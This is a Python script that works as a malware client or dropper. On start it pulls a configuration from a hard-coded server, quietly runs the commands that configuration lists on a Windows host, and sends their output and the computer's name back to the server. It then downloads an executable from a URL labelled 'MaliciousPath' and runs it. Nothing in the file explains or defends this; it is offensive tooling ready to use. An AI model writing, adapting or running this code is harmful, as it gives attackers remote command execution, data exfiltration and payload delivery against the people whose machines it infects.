import requests
import json
import sys, string, os
import subprocess
import datetime

SERVERADDRESS = 'http://10.0.0.6'
CONFIGURATIONPATH = '/Configuration'
HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
COMMANDSTOEXE = None
MALICIOUSURL = None


def HttpGetRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.get(SERVERADDRESS+path ,params=parameters, headers=HEADERS)
    return r.text

def HttpPostRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.post(SERVERADDRESS+path, data=parameters, headers=HEADERS)
    return r.text

def conf():

    global SERVERADDRESS
    global COMMANDSTOEXE
    global MALICIOUSURL

    conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
    #print(conf)
    #print(json.dumps(conf))
    SERVERADDRESS = 'http://'+conf['Server']
    COMMANDSTOEXE = conf['Commands']
    MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']

#def RunCommand(command):
#    run = os.popen(command)
#    results = run.read()
#    run.close()
#    return results

    #run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
    #cmd_out, cmd_err = run.communicate()
    #return (cmd_out.decode("utf-8"))

def subprocess_args(include_stdout=True):
    # The following is true only on Windows.
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        # Windows doesn't search the path by default. Pass it an environment so
        # it will.
        env = os.environ
    else:
        si = None
        env = None
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}

    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret


def launchWithoutConsole(command, args):
   """Launches 'command' windowless"""
   startupinfo = subprocess.STARTUPINFO()
   startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

   run = subprocess.Popen([command] + args, startupinfo=startupinfo,stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
   cmd_out, cmd_err = run.communicate()
   return (cmd_out.decode("utf-8"))

def PreperToSend(type,str):
    j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
    return j

def Activate():
    HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
    if COMMANDSTOEXE is not None:
        for command in COMMANDSTOEXE:
            HttpPostRequest('/Commands',PreperToSend(str(command),subprocess.check_output([str(command)],**subprocess_args(False)).decode("utf-8")))


def DownloadFile(url):
    #file = url.split('/')[-1]+'.exe'
    #r = requests.Session()
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True, headers=HEADERS)
    file = r.headers['Filename']
    with open(file, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush() commented by recommendation from J.F.Sebastian
    return file

def RemoveFile(local_filename):
    os.remove(local_filename)

def RunExeFile(file):
    os.system(file)



conf()
Activate()
RunExeFile(DownloadFile(MALICIOUSURL))
#print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'\ClientInfo',)
